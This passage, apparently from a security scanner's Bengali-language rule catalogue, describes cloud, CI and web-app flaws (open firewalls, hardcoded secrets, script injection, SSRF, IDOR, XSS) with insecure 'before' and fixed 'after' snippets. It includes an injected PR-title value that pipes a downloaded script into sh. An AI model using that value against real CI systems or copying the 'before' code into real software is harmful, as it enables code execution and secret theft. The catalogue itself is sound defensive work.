      'password/secret/token/key-এর মতো নামের একটি এনভায়রনমেন্ট ভেরিয়েবলের একটি Secret ("valueFrom.secretKeyRef") থেকে না পড়ে একটি লিটারাল মান ("value:") আছে। manifest নিজেই — প্রায়ই একটি রিপোজিটরিতে কমিট করা — তাই সিক্রেটটি প্লেইন টেক্সটে ধারণ করে, যা শুধু কনফিগারেশন পড়তে পারে এমন কারো কাছেও দৃশ্যমান, cluster-এ কমান্ড চালাতে না পারলেও।',
    fix: {
      before: `env:\n  - name: DB_PASSWORD\n    value: supersecret123`,
      after: `env:\n  - name: DB_PASSWORD\n    valueFrom:\n      secretKeyRef:\n        name: db-credentials\n        key: password`,
    },
  },
  "terraform-open-security-group": {
    title: "একটি Terraform security group পুরো ইন্টারনেটের জন্য একটি সংবেদনশীল পোর্ট খুলে দেয়",
    description:
      'একটি "cidr_blocks" (0.0.0.0/0, অর্থাৎ যেকোনো IP ঠিকানা সহ) রুল একটি সংবেদনশীল পোর্টের কাছাকাছি — SSH (22), RDP (3389), বা একটি সাধারণ ডেটাবেস পোর্ট (MySQL, Postgres, MongoDB, Redis, SQL Server)। ইন্টারনেটে যে কেউ সেই সার্ভিসে সংযোগ করার চেষ্টা করতে পারে, শুধু যার করা উচিত সে নয়।',
    fix: {
      before: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["0.0.0.0/0"]\n}`,
      after: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["10.0.0.0/16"]  # শুধু আপনার প্রাইভেট নেটওয়ার্ক, অথবা একটি bastion host\n}`,
    },
  },
  "gcp-firewall-open-to-internet": {
    title: "একটি Google Cloud ফায়ারওয়াল রুল পুরো ইন্টারনেটের জন্য একটি সংবেদনশীল পোর্ট খুলে দেয়",
    description:
      'একটি "google_compute_firewall" রিসোর্স, যার "source_ranges"-এ 0.0.0.0/0 (যেকোনো IP ঠিকানা) আছে, একটি সংবেদনশীল পোর্টে ট্র্যাফিকের অনুমতি দেয় — SSH (22), RDP (3389), বা একটি সাধারণ ডেটাবেস পোর্ট (MySQL, Postgres, MongoDB, Redis, SQL Server)। ইন্টারনেটে যে কেউ সেই সার্ভিসে সংযোগ করার চেষ্টা করতে পারে, শুধু যার করা উচিত সে নয়।',
    fix: {
      before: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["0.0.0.0/0"]\n}`,
      after: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["10.0.0.0/16"]  # শুধু আপনার প্রাইভেট নেটওয়ার্ক, অথবা একটি bastion host\n}`,
    },
  },
  "azure-nsg-open-to-internet": {
    title: "একটি Azure নেটওয়ার্ক রুল পুরো ইন্টারনেটের জন্য একটি সংবেদনশীল পোর্ট খুলে দেয়",
    description:
      'একটি নেটওয়ার্ক সিকিউরিটি রুল ("azurerm_network_security_rule", অথবা "azurerm_network_security_group"-এর ভেতরে একটি "security_rule" ব্লক) যার "source_address_prefix" "*" বা "0.0.0.0/0", direction "Inbound" এবং access "Allow", একটি সংবেদনশীল পোর্টের কাছাকাছি — SSH (22), RDP (3389), বা একটি সাধারণ ডেটাবেস পোর্ট। ইন্টারনেটে যে কেউ সেই সার্ভিসে সংযোগ করার চেষ্টা করতে পারে, শুধু যার করা উচিত সে নয়।',
    fix: {
      before: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "*"\n}`,
      after: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "10.0.0.0/16"  # শুধু আপনার প্রাইভেট নেটওয়ার্ক, অথবা একটি bastion host\n}`,
    },
  },
  "terraform-hardcoded-secret": {
    title: "একটি Terraform ভেরিয়েবলের ডিফল্ট মান হিসেবে একটি সিক্রেট লেখা আছে",
    description:
      'password/secret/token/key-এর মতো নামের একটি ভেরিয়েবলে এর "default"-এ একটি লিটারাল মান আছে। রানটাইমে পাস করা একটি মানের (tfvars, TF_VAR_* এনভায়রনমেন্ট ভেরিয়েবল) বিপরীতে, একটি ডিফল্ট সোর্স কোডে চলে যায় — এবং রিপোজিটরি শেয়ার করা বা পাবলিক হলে, Terraform state-এ অ্যাক্সেস ছাড়াই যে কেউ এটি দেখতে পারে।',
    fix: {
      before: `variable "db_password" {\n  default = "supersecret123"\n}`,
      after: `variable "db_password" {\n  # কোনো ডিফল্ট নেই: একটি .tfvars ফাইল (git-এর বাইরে) বা একটি TF_VAR_db_password এনভায়রনমেন্ট ভেরিয়েবল দিয়ে এটি পাস করুন\n  sensitive = true\n}`,
    },
  },
  "gha-script-injection": {
    title: "একজন বাহ্যিক ব্যবহারকারীর নিয়ন্ত্রিত একটি মান সরাসরি CI-এর একটি শেল কমান্ডে প্রবেশ করে",
    description:
      'একটি GitHub Actions ওয়ার্কফ্লোর "run:" কমান্ড সরাসরি একটি pull request-এর title, একটি branch-এর নাম, বা একটি কমেন্টের টেক্সটের মতো একটি মান interpolate করে — এগুলো সবই একটি বাহ্যিক fork থেকেও pull request বা কমেন্ট খোলা যে কেউ লিখতে পারে। `"; curl malware.sh | sh #` এর মতো একটি মান সেই ওয়ার্কফ্লোতে উপলব্ধ সব সিক্রেটসহ CI-তে নির্বিচারে কমান্ড চালাবে।',
    fix: {
      before: `- run: echo "\${{ github.event.pull_request.title }}"`,
      after: `- env:\n    PR_TITLE: \${{ github.event.pull_request.title }}\n  run: echo "$PR_TITLE"  # এনভায়রনমেন্ট ভেরিয়েবল হিসেবে পাস করা, কখনো সরাসরি কমান্ডে interpolate করা হয়নি`,
    },
  },
  "gha-pull-request-target-checkout": {
    title: "ওয়ার্কফ্লোটি রিপোজিটরির সিক্রেটে অ্যাক্সেসসহ একটি বাহ্যিক pull request-এর কোড চালায়",
    description:
      'ওয়ার্কফ্লোটি "pull_request_target" ব্যবহার করে — যা একটি সম্পর্কহীন fork থেকে খোলা একটি pull request-এর জন্যও base রিপোজিটরির পারমিশন ও সিক্রেট নিয়ে চলে — এবং base branch নয়, বরং pull request-এর নিজের কোড ("github.event.pull_request.head") চেকআউট করে। যে pull request খোলে সে কার্যকরভাবে সেই সিক্রেটগুলোতে অ্যাক্সেসসহ নিজের কোড চালানোর সুযোগ পায়।',
    fix: {
      before: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}`,
      after: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      # base branch চেকআউট করে, PR-এর কোড নয় — অথবা বেশি\n      # পারমিশন/সিক্রেট প্রয়োজন না হলে "pull_request_target"-এর বদলে\n      # "pull_request" ব্যবহার করুন।\n      - uses: actions/checkout@v4`,
    },
  },
  "insecure-deserialization": {
    title: "অনুরোধের ডেটা এমন একটি ফরম্যাটে deserialize করা হয় যা কোড চালাতে পারে",
    description:
      "pickle (Python), unserialize() (PHP), ObjectInputStream (Java), বা node-serialize লাইব্রেরি (Node) সরাসরি অনুরোধ থেকে নেওয়া একটি মান deserialize করছে। JSON-এর বিপরীতে, এই ফরম্যাটগুলো deserialization-এর সময়ই কোড represent ও execute করতে পারে — পাঠানো মান যে নিয়ন্ত্রণ করে সে সার্ভারে নির্বিচারে কোড execution পেতে পারে।",
    fix: {
      before: `data = pickle.loads(request.data)`,
      after: `import json\ndata = json.loads(request.data)  # pickle-এর বিপরীতে, parsing করার সময় JSON কখনো কোড চালায় না`,
    },
  },
  "jwt-none-algorithm": {
    title: 'কোডটি স্পষ্টভাবে sign ছাড়া JWT টোকেন গ্রহণ করে ("none" অ্যালগরিদম)',
    description:
      '"none" একটি JWT টোকেন যাচাই করার জন্য গৃহীত অ্যালগরিদমগুলোর মধ্যে আছে। "none" অ্যালগরিদমের একটি টোকেনের যাচাই করার মতো কোনো সিগনেচার নেই: যে কেউ যেকোনো কন্টেন্ট (যেমন একটি admin role) দিয়ে একটি তৈরি করতে পারবে এবং কোডটি এটিকে বৈধ হিসেবে গ্রহণ করবে।',
    fix: {
      before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
      after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // গৃহীত অ্যালগরিদমগুলোর মধ্যে কখনো "none" অন্তর্ভুক্ত করবেন না`,
    },
  },
  "unprotected-new-table": {
    title: "একটি নতুন টেবিল সুরক্ষা ছাড়াই তৈরি হয়েছে বলে মনে হচ্ছে",
    description:
      "একটি SQL মাইগ্রেশন একটি টেবিল তৈরি করে কিন্তু একই ফাইলে সেই একই টেবিলের জন্য Row Level Security চালু করে না। যতক্ষণ এটি এভাবে থাকে, টেবিলটি শুরু থেকেই কে এটি পড়তে বা লিখতে পারবে তার কোনো বিধিনিষেধ ছাড়াই তৈরি হয়।",
    fix: {
      before: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);`,
      after: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);\nALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;`,
    },
  },
  "permissive-cors": {
    title: "সাইটটি অন্য যেকোনো ওয়েবসাইট থেকে অনুরোধ গ্রহণ করে",
    description:
      "CORS হেডার যেকোনো origin (*) থেকে অনুরোধ গ্রহণ করার জন্য সেট করা আছে, অথবা cors() মিডলওয়্যার কোনো বিধিনিষেধ ছাড়াই ব্যবহার করা হয়েছে। যেকোনো তৃতীয় পক্ষের ওয়েবসাইট ইতিমধ্যে প্রমাণীকৃত একজন ব্যবহারকারীর ব্রাউজার থেকে আপনার API কল করতে পারে।",
    fix: {
      before: `app.use(cors())`,
      after: `app.use(cors({ origin: ["https://yoursite.com"] }))`,
    },
  },
  "admin-function-missing-auth": {
    title: "অ্যাডমিন পারমিশনসহ একটি ফাংশন কে এটি ব্যবহার করছে তা যাচাই করে না",
    description:
      "অ্যাডমিন অপারেশনের ইঙ্গিত দেয় এমন নামের একটি রুট বা ফাংশনে, কাছাকাছি লাইনগুলোতে কোনো প্রমাণীকরণ বা রোল যাচাই নেই। যে কেউ URL জানলে এটি চালাতে পারবে।",
    fix: {
      before: `router.post("/admin/delete-user", async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
      after: `router.post("/admin/delete-user", requireAuth, requireRole("admin"), async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
    },
  },
  ssrf: {
    title: "সাইটটিকে বাহ্যিক কোড চালাতে বাধ্য করা যেতে পারে",
    description:
      "একটি বহির্গামী HTTP অনুরোধ (fetch, axios) সরাসরি একজন ব্যবহারকারীর অনুরোধ থেকে আসা একটি মান destination URL হিসেবে ব্যবহার করে। একজন ক্ষতিকর ব্যবহারকারী আপনার সার্ভারকে অভ্যন্তরীণ বা নির্বিচারে ঠিকানায় কল করাতে পারে — Server-Side Request Forgery।",
    fix: {
      before: `const data = await fetch(req.query.url)`,
      after: `const ALLOWED = new Set(["https://api.yourservice.com"])\nif (!ALLOWED.has(req.query.url)) throw new Error("URL অনুমোদিত নয়")\nconst data = await fetch(req.query.url)`,
    },
  },
  "weak-password-hashing": {
    title: "পাসওয়ার্ডগুলো এমন একটি পদ্ধতিতে সুরক্ষিত যা এখন সহজেই ভাঙা যায়",
    description:
      "একই লাইনে, পাসওয়ার্ডের সাথে যুক্ত একটি মানে md5() বা sha1() প্রয়োগ করা হয়েছে। এই অ্যালগরিদমগুলো হিসাব করতে খুবই দ্রুত: ডেটাবেসসহ একজন আক্রমণকারী প্রতি সেকেন্ডে কোটি কোটি পাসওয়ার্ড চেষ্টা করতে পারে।",
    fix: {
      before: `const hashed = crypto.createHash("md5").update(password).digest("hex")`,
      after: `const hashed = await bcrypt.hash(password, 12)`,
    },
  },
  "k8s-run-as-root": {
    title: "Kubernetes manifest-এর একটি container root হিসেবে চলার জন্য সেট করা আছে",
    description:
      '"runAsUser: 0" বা "runAsNonRoot: false" securityContext-এ container-কে স্পষ্টভাবে root হিসেবে চলতে বাধ্য করে। একজন আক্রমণকারী যদি container-এর ভেতরে কোড চালাতে সক্ষম হয় (যেমন একটি ঝুঁকিপূর্ণ লাইব্রেরি exploit করে), container-এর ভেতরে root হওয়া host-এ escape করা — বা আরও বড় প্রভাব — সহজ করে দেয়।',
    fix: {
      before: `securityContext:\n  runAsUser: 0`,
      after: `securityContext:\n  runAsNonRoot: true\n  runAsUser: 1000`,
    },
  },
  "k8s-privilege-escalation": {
    title: "Kubernetes manifest-এর একটি container শুরুর চেয়ে বেশি privilege পেতে পারে",
    description:
      '"allowPrivilegeEscalation: true" securityContext-এ container-এর ভেতরের একটি প্রক্রিয়াকে এটি শুরু করা প্রক্রিয়ার চেয়ে বেশি privilege পেতে দেয় (যেমন একটি setuid বাইনারির মাধ্যমে)। অ্যাপ্লিকেশনের একটি ঝুঁকির সাথে মিলিয়ে, এটি উদ্দিষ্টের চেয়ে বেশি privilege দিয়ে কোড চালানোর দিকে আরেকটি ধাপ।',
    fix: {
      before: `securityContext:\n  allowPrivilegeEscalation: true`,
      after: `securityContext:\n  allowPrivilegeEscalation: false`,
    },
  },
  "k8s-host-namespace-access": {
    title: "Kubernetes manifest-এর একটি pod host-এর নেটওয়ার্ক, প্রক্রিয়া বা shared memory শেয়ার করে",
    description:
      '"hostNetwork", "hostPID" বা "hostIPC" true সেট করা pod-কে তার স্বাভাবিক isolation থেকে বের করে আনে: hostNetwork pod-কে host-এর নেটওয়ার্কে প্রকাশ করে (cluster-এর নেটওয়ার্ক পলিসি bypass করে), hostPID এটিকে host মেশিনের প্রতিটি প্রক্রিয়ার দৃশ্যমানতা দেয়, hostIPC এটিকে host-এর shared memory-তে অ্যাক্সেস দেয়। একটি সাধারণ অ্যাপের জন্য প্রায় কখনোই প্রয়োজন হয় না — সাধারণত শুধু নিম্ন-স্তরের সিস্টেম/মনিটরিং টুলের জন্য।',
    fix: {
      before: `spec:\n  hostNetwork: true`,
      after: `spec:\n  hostNetwork: false`,
    },
  },
  "terraform-s3-block-public-access-disabled": {
    title: "Terraform-এ ডিফাইন করা একটি S3 বাকেটে Block Public Access নিষ্ক্রিয় করা আছে",
    description:
      'অর্থাৎ "aws_s3_bucket_public_access_block"-এর চারটি সুরক্ষার (block_public_acls, ignore_public_acls, block_public_policy, restrict_public_buckets) এক বা একাধিক false সেট করা আছে। এর মানে এই নয় যে বাকেটটি ইতিমধ্যে পাবলিক, কিন্তু এটি এমন একটি সুরক্ষা জাল সরিয়ে দেয় যা ভবিষ্যতে ভুলবশত এটি পাবলিক হওয়া আটকাত।',
    fix: {
      before: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls = false\n}`,
      after: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls       = true\n  ignore_public_acls      = true\n  block_public_policy     = true\n  restrict_public_buckets = true\n}`,
    },
  },
  "terraform-iam-wildcard-policy": {
    title: "Terraform-এ ডিফাইন করা একটি IAM পলিসি পূর্ণ অ্যাক্সেস দেয়",
    description:
      'action "*" এবং resource "*" সহ একটি statement প্রতিটি AWS সার্ভিস ও রিসোর্সে পূর্ণ অ্যাক্সেস দেয় — এটি প্রয়োগ হওয়ার আগেই, সরাসরি কোড থেকে পড়া, live IAM state-এ ইতিমধ্যে করা একই যাচাই। এটি একটি জরুরি রোলের জন্য উদ্দিষ্ট হতে পারে, কিন্তু নিশ্চিত করা উচিত: দৈনন্দিন ব্যবহারের জন্য শুধু সত্যিই প্রয়োজনীয় পারমিশন দিন।',
    fix: {
      before: `statement {\n  effect    = "Allow"\n  actions   = ["*"]\n  resources = ["*"]\n}`,
      after: `statement {\n  effect    = "Allow"\n  actions   = ["s3:GetObject"]\n  resources = ["arn:aws:s3:::your-bucket/*"]\n}`,
    },
  },
  "gcp-storage-bucket-public": {
    title: "একটি Google Cloud Storage বাকেট যে কারো জন্য পঠনযোগ্য করা হয়েছে",
    description:
      'একটি "google_storage_bucket_iam_member" বা "google_storage_bucket_iam_binding" রিসোর্স "allUsers" বা "allAuthenticatedUsers"-কে একটি রোল দেয় — প্রথমটি বাকেটটিকে একটি Google অ্যাকাউন্ট ছাড়াই ইন্টারনেটে যে কারো জন্য পঠনযোগ্য করে তোলে; দ্বিতীয়টি যেকোনো Google অ্যাকাউন্টধারীর জন্য, শুধু যার অ্যাক্সেস থাকা উচিত তার জন্য নয়।',
    fix: {
      before: `resource "google_storage_bucket_iam_member" "public" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "allUsers"\n}`,
      after: `resource "google_storage_bucket_iam_member" "example" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "user:someone@example.com"  # শুধু যার সত্যিই অ্যাক্সেস থাকা উচিত, allUsers/allAuthenticatedUsers নয়\n}`,
    },
  },
  "azure-storage-public-access": {
    title: "একটি Azure স্টোরেজ অ্যাকাউন্টে পাবলিক blob অ্যাক্সেস সক্রিয় করা আছে",
    description:
      '"allow_blob_public_access" একটি "azurerm_storage_account"-এ true সেট করা আছে: পাবলিক করা একটি blob/container-এর URL যে কেউ জানলে, কোনো প্রমাণীকরণ ছাড়াই এটি পড়তে পারে।',
    fix: {
      before: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = true\n}`,
      after: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = false\n}`,
    },
  },
  "gcp-iam-overly-broad-role": {
    title: "একটি Google Cloud IAM রোল পূর্ণ অ্যাক্সেস দেয় (Owner/Editor)",
    description:
      'একটি "google_project_iam_binding"/"google_project_iam_member" (অথবা organization/folder স্তরে সমতুল্য) প্রিমিটিভ রোল "roles/owner" বা "roles/editor" অ্যাসাইন করে — প্রজেক্টের প্রায় প্রতিটি সার্ভিসে প্রায় সম্পূর্ণ অ্যাক্সেস। এটি একটি জরুরি অ্যাকাউন্টের জন্য উদ্দিষ্ট হতে পারে, কিন্তু নিশ্চিত করা উচিত: দৈনন্দিন ব্যবহারের জন্য শুধু সত্যিই প্রয়োজনীয় আরও নির্দিষ্ট প্রিডিফাইনড রোল দিন।',
    fix: {
      before: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/owner"\n  member  = "user:dev@example.com"\n}`,
      after: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/storage.admin"  # শুধু সত্যিই প্রয়োজনীয় প্রিডিফাইনড রোল, roles/owner নয়\n  member  = "user:dev@example.com"\n}`,
    },
  },
  "azure-role-assignment-owner": {
    title: "একটি Azure role assignment পূর্ণ অ্যাক্সেস দেয় (Owner)",
    description:
      'একটি "azurerm_role_assignment" পুরো অ্যাসাইন করা scope-এ (subscription, resource group...) "Owner" রোল অ্যাসাইন করে — অন্য ব্যবহারকারীদের পারমিশনের উপর নিয়ন্ত্রণসহ পূর্ণ অ্যাক্সেস। এটি একটি জরুরি অ্যাকাউন্টের জন্য উদ্দিষ্ট হতে পারে, কিন্তু নিশ্চিত করা উচিত: দৈনন্দিন ব্যবহারের জন্য শুধু সত্যিই প্রয়োজনীয় আরও নির্দিষ্ট রোল দিন (যেমন একটি একক resource group-এ "Contributor")।',
    fix: {
      before: `resource "azurerm_role_assignment" "example" {\n  scope                = data.azurerm_subscription.primary.id\n  role_definition_name = "Owner"\n}`,
      after: `resource "azurerm_role_assignment" "example" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = "Contributor"  # শুধু সত্যিই প্রয়োজনীয় আরও নির্দিষ্ট রোল, পুরো subscription-এ Owner নয়\n}`,
    },
  },
  "weak-random-token": {
    title: "একটি নিরাপত্তা টোকেন ক্রিপ্টোগ্রাফিকভাবে নিরাপদ নয় এমন একটি random number generator দিয়ে তৈরি",
    description:
      "token/session/reset/otp/csrf-এর মতো নামের একটি মান Math.random() (JS), random.random() (Python), বা rand() (PHP) দিয়ে তৈরি করা হয়েছে — এগুলো নিরাপত্তার জন্য ডিজাইন করা জেনারেটর নয়, যাদের sequence অনুমানযোগ্য। এভাবে তৈরি একটি টোকেন অনুমান বা পুনর্নির্মাণ করা যেতে পারে, যে উদ্দেশ্যে এটি তৈরি তা ব্যর্থ করে দিয়ে (যেমন একটি পাসওয়ার্ড রিসেট লিঙ্ক যা যে কেউ অনুমান করতে পারে)।",
    fix: {
      before: `const resetToken = Math.random().toString(36).slice(2);`,
      after: `const resetToken = crypto.randomBytes(32).toString("hex"); // crypto, Math.random নয় — অনুমানযোগ্য নয়`,
    },
  },
  "ldap-injection": {
    title: "একটি LDAP ফিল্টার সরাসরি অনুরোধের একটি মান concatenate করে তৈরি করা হয়",
    description:
      'একটি LDAP ফিল্টার তৈরি করে এমন একটি লাইন (যেমন "(uid=...)") কোনো LDAP বিশেষ অক্ষর escape না করেই সরাসরি অনুরোধ থেকে নেওয়া একটি মান অন্তর্ভুক্ত করে। যে সেই মান নিয়ন্ত্রণ করে সে ফিল্টারের লজিক পরিবর্তন করতে পারে — যেমন একটি প্রমাণীকরণ যাচাই বাইপাস করা অথবা যা দেখা উচিত নয় এমন ডিরেক্টরি ডেটা পড়া।',
    fix: {
      before: "const filter = `(uid=${req.body.username})`;\nclient.search(base, { filter });",
      after: "const filter = `(uid=${ldapEscape(req.body.username)})`; // একটি ফিল্টারে ব্যবহার করার আগে LDAP বিশেষ অক্ষরগুলো সবসময় escape করতে হবে\nclient.search(base, { filter });",
    },
  },
  "xss-dangerous-html": {
    title: "ব্যবহারকারীদের লেখা টেক্সট ব্রাউজারে কোড চালাতে পারে",
    description:
      "কন্টেন্ট পৃষ্ঠায় সাধারণ টেক্সটের বদলে raw HTML হিসেবে ঢোকানো হয় (dangerouslySetInnerHTML, v-html, .innerHTML)। সেই কন্টেন্টে যদি ব্যবহারকারীর ইনপুট থাকে, তাহলে এতে এমন স্ক্রিপ্ট থাকতে পারে যা পৃষ্ঠাটি যে পড়ছে তার ব্রাউজারে চলে।",
    fix: {
      before: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`,
      after: `<div>{comment.text}</div>\n// অথবা, HTML প্রয়োজন হলে: DOMPurify.sanitize(comment.text)`,
    },
  },
  "public-storage-bucket": {
    title: "আপলোড করা ফাইলের জায়গা যে কেউ দেখতে পারে",
    description:
      "একটি স্টোরেজ বাকেট (Supabase Storage, S3) পাবলিক হিসেবে কনফিগার করা আছে। এতে যদি ডকুমেন্ট, ছবি বা ব্যবহারকারীদের আপলোড করা ফাইল থাকে, তাহলে যে কেউ পাথটি জানে — বা অনুমান করে — সে প্রমাণীকরণ ছাড়াই এতে অ্যাক্সেস পেতে পারে।",
    fix: {
      before: `supabase.storage.createBucket("uploads", { public: true })`,
      after: `supabase.storage.createBucket("uploads", { public: false })\n// সময়সীমাবদ্ধ সাইন করা URL দিয়ে ফাইল পরিবেশন করুন: createSignedUrl(path, 60)`,
    },
  },
  "csrf-state-changing-get": {
    title: "ডেটা মুছতে বা পরিবর্তন করতে একটি লিঙ্কই যথেষ্ট",
    description:
      "একটি GET রুট এমন একটি অপারেশন করে যা ডেটা পরিবর্তন করে (পাথে delete/remove/update/edit থাকে)। শুধু একটি লিঙ্কে ভিজিট করে বা বাইরের কোনো সাইট থেকে একটি ছবি লোড করেই GET অনুরোধ চলে যায় — এটি CSRF আক্রমণের ক্লাসিক ভিত্তি।",
    fix: {
      before: `router.get("/posts/:id/delete", deletePost)`,
      after: `router.post("/posts/:id/delete", requireAuth, csrfProtection, deletePost)`,
    },
  },
  "insecure-token-storage": {
    title: "ব্রাউজারে সংরক্ষিত লগইন ডেটা ভালোভাবে সুরক্ষিত নয়",
    description:
      "একটি অ্যাক্সেস টোকেন localStorage-এ সংরক্ষণ করা হয়। একটি httpOnly কুকির বিপরীতে, পৃষ্ঠায় চলা যেকোনো স্ক্রিপ্ট (এমনকি XSS দিয়ে ইনজেক্ট করা একটি ক্ষতিকর স্ক্রিপ্টও) এটি পড়ে চুরি করতে পারে।",
    fix: {
      before: `localStorage.setItem("authToken", token)`,
      after: `// সার্ভার থেকে টোকেনটি httpOnly কুকি হিসেবে সেট করুন:\nres.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "open-redirect": {
    title: "সাইটটি একটি প্রতারণামূলক ওয়েবসাইটে রিডাইরেক্ট করতে ব্যবহার করা যেতে পারে",
    description:
      "সাইটটি ব্যবহারকারীকে সরাসরি অনুরোধ থেকে নেওয়া একটি ঠিকানায় রিডাইরেক্ট করে (query, body, params), এটি পরিচিত ডোমেইন কিনা তা যাচাই না করেই। এমন একটি লিঙ্ক যা আপনার সাইটে নিয়ে যাচ্ছে বলে মনে হয়, তা আসলে একটি ফিশিং পেজে নিয়ে যেতে পারে।",
    fix: {
      before: `res.redirect(req.query.next)`,
      after: `const ALLOWED = new Set(["/dashboard", "/profile"])\nres.redirect(ALLOWED.has(req.query.next) ? req.query.next : "/dashboard")`,
    },
  },
  idor: {
    title: "ঠিকানায় একটি সংখ্যা পরিবর্তন করলে অন্য কারো ডেটা দেখা যেতে পারে",
    description:
      "একটি ডেটাবেস কোয়েরি সরাসরি URL থেকে নেওয়া একটি identifier ব্যবহার করে (req.params.id), কাছাকাছি লাইনগুলোতে এটি যাচাই না করেই যে এটি অনুরোধকারী ব্যবহারকারীর। ঠিকানায় id পরিবর্তন করলে অন্য একজন ব্যবহারকারীর ডেটায় অ্যাক্সেস পাওয়া যেতে পারে — Insecure Direct Object Reference।",
    fix: {
      before: `const order = await Order.findById(req.params.id)`,
      after: `const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })`,
    },
  },
  "header-injection": {
    title: "অনুরোধের একটি মান সরাসরি একটি HTTP response header-এ চলে যায়",
    description:
      "একটি HTTP response header সরাসরি অনুরোধ থেকে নেওয়া একটি মান (query, body, params) দিয়ে সেট করা হয়, এতে line break (CRLF) আছে কিনা তা যাচাই না করেই। একজন আক্রমণকারী অতিরিক্ত header বা এমনকি সম্পূর্ণ ভিন্ন একটি response — response splitting — ঢোকাতে পারে, caching, cookie বা অন্য ব্যবহারকারীদের দেখানো কন্টেন্ট পরিবর্তন করতে সক্ষম হয়ে।",
    fix: {
      before: `res.setHeader("X-Redirect-Reason", req.query.reason)`,
      after: `const ALLOWED_REASONS = new Set(["expired", "manual"])\nres.setHeader("X-Redirect-Reason", ALLOWED_REASONS.has(req.query.reason) ? req.query.reason : "unknown")`,
    },
  },
  "docker-missing-user": {
    title: "Dockerfile একটি non-root ব্যবহারকারী সেট করে না",
    description:
      "Dockerfile-এ কোনো USER নির্দেশ নেই: এটি ছাড়া, container root হিসেবে চলে। একজন আক্রমণকারী যদি container-এর ভেতরে কোড চালাতে সক্ষম হয় (যেমন একটি ঝুঁকিপূর্ণ লাইব্রেরি exploit করে), তাহলে container-এর ভেতরে root হওয়া host-এ escape করা — বা চারপাশের সিস্টেমে আরও বড় প্রভাব — সহজ করে দেয়।",
    fix: {
      before: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]`,
      after: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nUSER node\nCMD ["node", "server.js"]`,
    },
  },
  "k8s-missing-run-as-non-root": {
    title: "Kubernetes manifest স্পষ্টভাবে non-root ব্যবহারকারী হিসেবে চালানো বাধ্যতামূলক করে না",
    description:
      'manifest-এ কোথাও "runAsNonRoot" নেই (না pod স্তরে, না container স্তরে): এটি সেট না করলে, একটি container তার ইমেজে ডিফাইন করা যেকোনো ব্যবহারকারী হিসেবে চলে — ইমেজ নিজে এটি পরিবর্তন না করলে প্রায়ই ডিফল্টভাবে root। এটি স্পষ্টভাবে true সেট করলে, ইমেজ তবুও root হিসেবে চালানোর চেষ্টা করলে pod শুরু হতে ব্যর্থ হয়, শুধু একটি ঘটনার পরে এটি জানার বদলে।',
    fix: {
      before: `containers:\n  - name: app\n    image: myapp:1.0`,
      after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
    },
  },
  "gha-unpinned-action": {
    title: "CI-এর একটি তৃতীয় পক্ষের action একটি নির্দিষ্ট ভার্সনে (commit SHA) লক করা নেই",
    description:
      'ওয়ার্কফ্লোটি commit SHA দিয়ে নয়, বরং tag বা branch (যেমন "@v1", "@main") দিয়ে রেফারেন্স করা একটি তৃতীয় পক্ষের action ব্যবহার করে। যে এটি maintain করে — বা যে তার অ্যাকাউন্ট compromise করে — সে যেকোনো সময় সেই রেফারেন্সটি একটি ভিন্ন commit-এ সরাতে পারে, CI-তে কী চলছে তা নীরবে পরিবর্তন করে, তার সিক্রেটগুলোতে অ্যাক্সেসসহ। একটি commit SHA সবসময় একই, হুবহু কোডের দিকে নির্দেশ করে।',
    fix: {
      before: `uses: some-org/some-action@v1`,
      after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1, commit SHA-তে পিন করা — ভার্সন আপডেট করার সময় SHA আপডেট করুন`,
    },
  },
  "gha-excessive-permissions": {
    title: "ওয়ার্কফ্লোটি শুধু যা ব্যবহার করে তা নয়, বরং টোকেনের সব পারমিশন নিজেকে দেয়",
    description:
